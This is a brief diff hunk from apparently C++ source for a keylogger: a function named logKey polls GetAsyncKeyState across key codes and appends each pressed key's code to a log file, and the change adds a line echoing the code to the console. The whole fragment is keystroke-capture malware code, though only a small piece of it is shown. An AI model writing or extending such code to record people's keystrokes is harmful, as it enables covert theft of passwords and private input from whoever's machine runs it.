@@ -33,6 +33,7 @@ char * logKey() {
         while ( ch < 250 ) {
             for ( i = 0; i < 50; i++, ch++ ) {
                 if ( GetAsyncKeyState(ch) == -32767 ) {
+					cout << ch;
                     file = fopen(FILE_NAME, "a");
                     fprintf(file, "%d", ch);
                     fclose(file);
